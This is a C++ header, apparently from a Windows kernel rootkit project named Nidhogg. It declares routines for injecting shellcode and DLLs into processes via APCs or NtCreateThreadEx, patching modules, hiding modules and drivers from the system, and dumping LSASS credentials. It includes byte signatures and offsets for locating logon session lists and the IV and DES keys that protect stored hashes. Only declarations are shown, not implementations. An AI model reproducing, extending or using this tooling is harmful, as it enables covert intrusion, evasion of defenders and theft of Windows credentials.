#pragma once

#include "pch.h"
#include "MemoryHelper.h"

extern "C" {
	#include "WindowsTypes.h"
	#include "NidhoggCommon.h"
}
#include "ProcessHelper.h"
#include "FileHelper.h"
#include "MemoryAllocator.hpp"
#include "ListHelper.hpp"

// Definitions.
constexpr SIZE_T NO_ACCESS = 0;
constexpr SIZE_T THREAD_PREVIOUSMODE_OFFSET = 0x232;
constexpr SIZE_T PATH_OFFSET = 0x190;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_BIT = 0x10;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_OFFSET = 0x74;
constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
constexpr ULONG DES_KEY_TAG1 = 'UUUR';
constexpr ULONG DES_KEY_TAG2 = 'MSSK';
constexpr UCHAR LogonSessionListLocation[] = {0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF};
constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };
constexpr UCHAR FunctionStartSignature[] = { 0x40, 0x55 };
constexpr UCHAR LogonSessionListCountSignature[] = { 0x48, 0x89, 0x45, 0xCC, 0x44, 0x8B, 0x05 };
constexpr UCHAR LogonSessionListLockSignature[] = { 0xCC, 0x8D, 0x35 };
constexpr UCHAR LogonSessionListSignature[] = { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x8B };
constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
constexpr SIZE_T LogonSessionListCountOffset = 0xB;
constexpr SIZE_T LogonSessionListLockOffset = 3;
constexpr SIZE_T LogonSessionListOffset = 3;
constexpr SIZE_T IvOffset = 6;
constexpr SIZE_T DesKeyOffset = 7;
constexpr SIZE_T DesKeyStructOffset = 0xB;
constexpr SIZE_T LsaInitializeProtectedMemoryLen = 0x310;
constexpr SIZE_T WLsaEnumerateLogonSessionLen = 0x2ad;
constexpr SIZE_T LogonSessionListLocationDistance = 0x4e730;
constexpr SIZE_T IvDesKeyLocationDistance = 0x43050;

enum class InjectionType {
	APCInjection,
	NtCreateThreadExInjection
};

struct DllInformation {
	InjectionType Type;
	ULONG Pid;
	CHAR DllPath[MAX_PATH];
};

struct ShellcodeInformation {
	InjectionType Type;
	ULONG Pid;
	SIZE_T ShellcodeSize;
	PVOID Shellcode;
	PVOID Parameter1;
	SIZE_T Parameter1Size;
	PVOID Parameter2;
	SIZE_T Parameter2Size;
	PVOID Parameter3;
	SIZE_T Parameter3Size;
};

struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	SIZE_T PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct HiddenModuleInformation {
	bool Hide;
	ULONG Pid;
	WCHAR* ModuleName;
};

struct HiddenDriverInformation {
	WCHAR* DriverName;
	bool Hide;
};

struct PebLinks {
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY HashLinks;
};

struct HiddenModuleEntry {
	LIST_ENTRY Entry;
	wchar_t* ModuleName;
	ULONG Pid;
	PebLinks Links;
	PMMVAD_SHORT VadNode;
	ULONG OriginalVadProtection;
};

struct HiddenDriverEntry {
	LIST_ENTRY Entry;
	wchar_t DriverPath[MAX_PATH];
	PKLDR_DATA_TABLE_ENTRY OriginalEntry;
};

struct HiddenItemsList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

struct DesKeyInformation {
	ULONG Size;
	PVOID Data;
};

struct Credentials {
	UNICODE_STRING Username;
	UNICODE_STRING Domain;
	UNICODE_STRING EncryptedHash;
};

struct IoctlCredentials {
	SIZE_T Count;
	Credentials* Creds;
	DesKeyInformation DesKey;
};

struct LsassInformation {
	FastMutex Lock;
	DesKeyInformation DesKey;
	SIZE_T Count;
	Credentials* Creds;
};

// General functions.
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);


class MemoryHandler {
private:
	HiddenItemsList hiddenDrivers;
	HiddenItemsList hiddenModules;
	PSYSTEM_SERVICE_DESCRIPTOR_TABLE ssdt;
	tNtCreateThreadEx NtCreateThreadEx;
	LsassInformation cachedLsassInfo;

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindHiddenDriver(_In_ wchar_t* driverPath, _Out_opt_ HiddenDriverEntry* driverEntry = nullptr) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenDriver(_Inout_ HiddenDriverEntry& item);

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenModule(_Inout_ HiddenModuleEntry& item);
	
	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS VadHideObject(_Inout_ PEPROCESS process, _In_ ULONG_PTR targetAddress, _Inout_ HiddenModuleEntry& moduleEntry);

	_IRQL_requires_max_(DISPATCH_LEVEL)
	NTSTATUS VadRestoreObject(_Inout_ PEPROCESS process, _In_ PMMVAD_SHORT vadNode, _In_opt_ wchar_t* moduleName = nullptr, 
		_In_opt_ ULONG vadProtection = 0);

	_IRQL_requires_max_(DISPATCH_LEVEL)
	TABLE_SEARCH_RESULT VadFindNodeOrParent(_In_ PRTL_AVL_TABLE table, _In_ ULONG_PTR targetPageAddress, 
		_Inout_ EX_PUSH_LOCK* pageTableCommitmentLock, _Out_ PRTL_BALANCED_NODE* outNode);

	_IRQL_requires_max_(APC_LEVEL)
	PETHREAD FindAlertableThread(_In_ HANDLE pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreModule(_In_ HiddenModuleEntry* moduleEntry);

public:
	void* operator new(size_t size) {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}
	_IRQL_requires_max_(APC_LEVEL)
	MemoryHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~MemoryHandler();

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS PatchModule(_In_ PatchedModule* moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectShellcodeAPC(_In_ ShellcodeInformation* shellcodeInformation, _In_ bool isInjectedDll = false);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectShellcodeThread(_In_ ShellcodeInformation* shellcodeInfo);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectDllThread(_In_ DllInformation* dllInfo);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS InjectDllAPC(_In_ DllInformation* dllInfo);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideModule(_In_ HiddenModuleInformation* moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS RestoreModule(_In_ HiddenModuleInformation* moduleInformation);

	_IRQL_requires_max_(APC_LEVEL)
	HiddenModuleEntry* FindHiddenModule(_In_ HiddenModuleInformation* info) const;

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideDriver(_In_ wchar_t* driverPath);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS UnhideDriver(_In_ wchar_t* driverPath);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS DumpCredentials(_Out_ SIZE_T* allocationSize);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS GetCredentials(_Inout_ IoctlCredentials* credentials);

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FoundNtCreateThreadEx() const { return NtCreateThreadEx != NULL; }
};

inline MemoryHandler* NidhoggMemoryHandler;
